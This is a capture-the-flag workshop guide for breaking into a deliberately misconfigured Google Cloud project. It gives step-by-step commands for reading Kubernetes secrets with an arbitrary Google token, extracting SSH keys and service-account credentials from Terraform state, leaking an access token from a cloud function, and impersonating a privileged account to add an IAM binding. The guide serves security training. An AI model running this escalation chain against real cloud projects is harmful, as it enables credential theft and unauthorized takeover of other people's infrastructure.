# CTF Guide

## Your Goal

Your goal of this CTF is to exploit a vulnerable GCP project and find up to 5 flags.
During the challenge you will be able to move through the environment and step by step escalate your privileges until you manage the IAM bindings on the project, essentially allowing you to gain control of all resources in the project.
(In our CTF workshop setup, we have to keep you in check a bit and you will only be able to manage specific IAM bindings.)

## Prerequisites

To play this CTF and participate in our workshop you will need:
- A notebook and an internet connection
- A Google account. Any Google account such as `your-throwaway@gmail.com ` is enough. It does not have to be a Google Cloud account. 
- The [gcloud](https://cloud.google.com/sdk/docs/install) command line utility installed on your computer.

## Your starting point

The cloud services in the project might be misconfigured or leak information that can be useful for you as an attacker.
You'll start out with just an IP address as your first piece of information.

We are providing you with useful hints and commands for each challenge.
Don't hesitate to use them, as you will have limited time for this CTF during our workshop.

## Challenges

### Challenge 1: Confidential Cluster

You received just an IP address as your very first entrypoint into the GCP project.  
The IP belongs to a Google Kubernetes Cluster (GKE) - how can you access the Kubernetes API to learn more about the cluster?

To simplify your next commands, set the IP address as an environment variable:  
#####
    export IP=<IP>

You can access the API of the cluster at this endpoint:  
#####
    curl -k https://$IP/api

As you are not authenticated, you are part of the group `system:anonymous` and you can't access much.  
Most endpoints will respond with 403 permission denied.  

But what if you were in `system:authenticated`? 
Try to get a token for your own Google account using the OAuth playground (select scope "Kubernetes Engine API v1").  

Set your token as environment variable to make the next commands easier to use.  
#####
    export TOKEN=<token>

Send a request with your token to the Kubernetes API:  
#####
    curl -k -H "Authorization:Bearer $TOKEN" https://$IP/api/

Just by supplying any Google access token you will be able to access the endpoint!  

Once you have obtained access and can read from the Kubernetes API - what API resources can you query?

You can find out which permissions 'system:authenticated' has on this cluster with a request to this endpoint:  
#####
    curl -k -X POST -H "Content-Type: application/json" -d '{"apiVersion":"authorization.k8s.io/v1", "kind":"SelfSubjectRulesReview", "spec":{"namespace":"default"}}' -H "Authorization:Bearer $TOKEN" https://$IP/apis/authorization.k8s.io/v1/selfsubjectrulesreviews

It looks like you have read access to some resources on the default namespace of the cluster.  
You can also query them by using the Kubernetes API:  
#####
    curl -k -H "Authorization:Bearer <token>" https://<IP>/api/v1/namespaces/default/...

#### Useful commands and tools:

- `curl -k https://<IP>`
- `curl -k -H "Authorization:Bearer <token>" https://<IP>/api/v1/namespaces/default/...`
- [Google OAuth Playground](https://developers.google.com/oauthplayground/)
- Learn more about this misconfiguration [here](https://orca.security/resources/blog/sys-all-google-kubernetes-engine-risk)

#### Hints

<details>
  <summary>Hint 1</summary>

  You can read Kubernetes secrets in the default namespace on the cluster. Which secrets might it hold?  
  #####
      curl -k -H "Authorization:Bearer $TOKEN" https://$IP/api/v1/namespaces/default/secrets

</details>

<details>
  <summary>Hint 2</summary>

  The secret values are base64 encoded. Decode them to read the value:  
  #####
      echo -n <secret-value> | base64 -d  

</details>

### Challenge 2: State of affairs

You found credentials for a GCP service account.
The json blob already provides some useful information. It contains the GCP project ID, the email of the service account (client_e-mail) and the private key of the account.  

To use the project id in other commands later during this challenge, set it as environment variable:  
#####
    export PROJECT_ID=<project-id>

Save the json blob in a file. You can now also use it as a credential for the gcloud CLI:  
#####
    gcloud auth activate-service-account --key-file <path-to-file>
You can check that this worked when running:  
#####
    gcloud auth list
It now shows the service account as active account.  
So what can you do with this account? Did you find any hints during challenge 1?  
Take another look at the response of the Kubernetes API when you listed the secrets.

#### Useful commands and tools:
- gsutil (already installed with gcloud): `gsutil ls gs://<...>`

#### Hints
<details>
  <summary>Hint 1</summary>

  The kubernetes secret you found in challenge 1 has a label telling you the name of a storage bucket.
  While the service account can't list all storage buckets, it might still have access to this specific bucket.  

</details>

<details>
  <summary>Hint 2</summary>

  The service account key you found on the GKE cluster can access a storage bucket called `file-uploads-$PROJECT_ID`.  
  See what you can find on the bucket by using the `gsutil` command line utility.  
  #####
    gsutil ls gs://<bucket-name>

</details>

### Challenge 3: Computing power

The file on the storage bucket is pretty useful for you as attacker.  
That seems to be the leftovers of a terraform pipeline that someone set up for this GCP project.  
They deployed parts of the infrastructure with terraform and the terraform state file tells you how that infrastructure is configured.  

Would that help you to move on into other infrastructure deployed here?

#### Hints
<details>
  <summary>Hint 1</summary>

  The state file contains the parameters that were used to set up a Google Compute Engine VM.  
  But additionally, it contains a secret ...  
  Can you combine this information to access the VM?

</details>

<details>
  <summary>Hint 2</summary>

  The state file conveniently contains the external IP address of a compute engine that was deployed with terraform. 
  It also reveals the name of a user who has ssh access to the VM.   
  But someone also created a Google Secret Manager secret with terraform and specified the secret value as well.  
  If you do that, your terraform state file will contain the secret value in plain text.  
  Use the SSH key you find in the secret to SSH into the VM.  

</details>

<details>
  <summary>Hint 3</summary>

  Save the SSH private key that you find in the terraform state in a file.  
  You'll also find the IP address of the compute instance in the parameter "nat_ip". The "metadata" parameter tells you that a user named "alice" has SSH access to this instance.  
  #####
      ssh -i <private key file> alice@<compute instance IP> 

</details>

### Challenge 4: Invoking answers

You can control a compute instance in the project! Let's look around a bit to find out what this instance can do.  
Your compute instance has a GCP service account assigned to it, allowing it to interact with the GCP APIs.  
Check which service account this instance uses and what this account can do.  
#####
    gcloud auth list

**Background info**:  
Resources such as compute VMs use the Google metadata server endpoint to get an access token for their assigned service account.  
As you now have access to the compute VM, you could also query the metadata server and retrieve information such as the VMs service account or its access token. For example you can use this endpoint to get information about the VMs service account:  
#####
    curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/" -H "Metadata-Flavor: Google"

As the compute instance has gcloud installed, using `gcloud auth list` or `gcloud auth print-access-token` is more convenient though.  

The service account of this compute engine is the default compute service account! A very powerful account in GCP.  
By default, it has the "Editor" role on a GCP project! But before getting too excited ... try using some of your new powers:  
#####
    gcloud compute instances list
"Request had insufficient authentication scopes". That is disappointing.  
You can list your OAuth access scopes with this command:  
#####
    curl -i https://www.googleapis.com/oauth2/v3/tokeninfo\?access_token=$(gcloud auth print-access-token)

That last access scope looks promising. The access scope `devstorage.read_only` allows you to read all storage buckets in the project.  

#### Useful commands and tools:
- the compute engine also has gcloud installed
- `gcloud auth list`
- `gcloud auth print-access-token`
- `gcloud auth print-identity-token`
- [GCP oauth access scopes](https://developers.google.com/identity/protocols/oauth2/scopes#storage)
- `gsutil ls gs://<..>`
- `gsutil cat gs://<..>`
- `curl -H "Authorization:Bearer <token>" https://...`
- [Metadata server](https://cloud.google.com/functions/docs/securing/function-identity#access-tokens)

#### Hints

<details>
  <summary>Hint 1</summary>

  List all storage buckets in the project. You can run the `gsutil` commands from the compute VM:  
  #####
      gsutil ls 
  There is an additional bucket that you couldn't access before. You can list and read the content on this bucket:
  #####
      gsutil ls gs://cloud-function-bucket-challenge4
  #####
      gsutil cat gs://cloud-function-bucket-challenge4/main.py
  A script on the compute engine can also give you more hints on how to use the new resource you found.

</details>

<details>
  <summary>Hint 2</summary>

  A cloud function is running in the project. When deploying a cloud function in GCP, its source code gets uploaded onto a storage bucket. As you have read access to the buckets, you can investigate what this function does.  
  A script in Alice's home directory on the compute VM tells you how to invoke the function.  
  Someone had it return information from the metadata server for debugging purposes...

</details>

<details>
  <summary>Hint 3</summary>
    
  The script on the compute VM invokes the function. You can modify that request and ask the function to return its access token instead of its service account email:
  #####
      curl -s -X POST https://europe-west1-$PROJECT_ID.cloudfunctions.net/challenge4-function -H "Authorization: bearer $(gcloud auth print-identity-token)" -H "Content-Type: application/json" -d '{"metadata": "token"}'

</details>

### Summary

You extracted a new access token! Let's see what this one can do.  
You can use the tokeninfo endpoint again to find out:  
#####
    curl -i https://www.googleapis.com/oauth2/v3/tokeninfo\?access_token=<token>
Cloud functions by default are also using the compute engine default service account - but with the full `cloud-platform` access scope!  

That should get you a set of nice new permissions on this GCP project.  
You can tell gcloud to use your new token by setting it as environment variable:  
#####
     export CLOUDSDK_AUTH_ACCESS_TOKEN=<function token>

Now, let's try to list the IAM policy on this GCP project to see which project-level access your account has:  
#####
    gcloud projects get-iam-policy $PROJECT_ID

You are Editor on this project which allows you read and write access to almost all resources.  
Congratulations! You compromised this GCP project.  

### Bonus Challenge 5: Admin Impersonation
There is one last level of control you can achieve - gaining persistent access!  
Wouldn't it be nice if you could add your own Google account to this project?  
You can try to set an IAM binding on the project level. But while the compute account you compromised is powerful, it can't modify the IAM settings on the project.  
But maybe another service account can?  

Note: In this CTF challenge the only role you can grant your own Google account on the project level is "role/viewer".  

List the other service accounts on this project:
#####
    gcloud iam service-accounts list

The `terraform-pipeline` account might be powerful. When you take a look again at the IAM bindings set on the project, this account has a role called `TerraformPipelineProjectAdmin`.  
This looks like a custom role the developers created for their terraform pipeline.  
Let's see what permissions it contains:  
#####
    gcloud iam roles describe TerraformPipelineProjectAdmin --project $PROJECT_ID
This role allows setting new IAM bindings on the project!  
You haven't compromised any resource that uses this service account, but luckily the compute service account that you control has the `serviceAccountTokenCreator` role on it:  
#####
    gcloud iam service-accounts get-iam-policy <terraform service account>

#### Useful commands and tools:
- list the IAM bindings on project level: `gcloud projects get-iam-policy $PROJECT_ID`
- list service accounts: `gcloud iam service-accounts list` 
- get IAM bindings showing who can control this service account: `gcloud iam service-accounts get-iam-policy <service account>`
- the [ServiceAccountTokenCreator role](https://cloud.google.com/iam/docs/service-account-permissions#token-creator-role)

#### Hints

<details>
  <summary>Hint 1</summary>

  The `serviceAccountTokenCreator` role, allowing service account impersonation!  
  The compute service account can leverage the permissions of the terraform pipeline account by impersonating it.  
  If you want to run gcloud commands while impersonating a service account, you can add the `--impersonate-service-account` flag to your gcloud command.

</details>

<details>
  <summary>Hint 2</summary>

  Add your own Google Account to the GCP project by running:  
    `gcloud projects add-iam-policy-binding $PROJECT_ID --member=user:<your Google account> --role=roles/viewer --impersonate-service-account <terraform pipeline account>`

</details>

When you complete the bonus challenge, you should be able to access this project in the cloud console in your browser.  
Log in with the Google account you just added.  

You finished the challenge and pwnd the vulnerable Google Cloud Project!


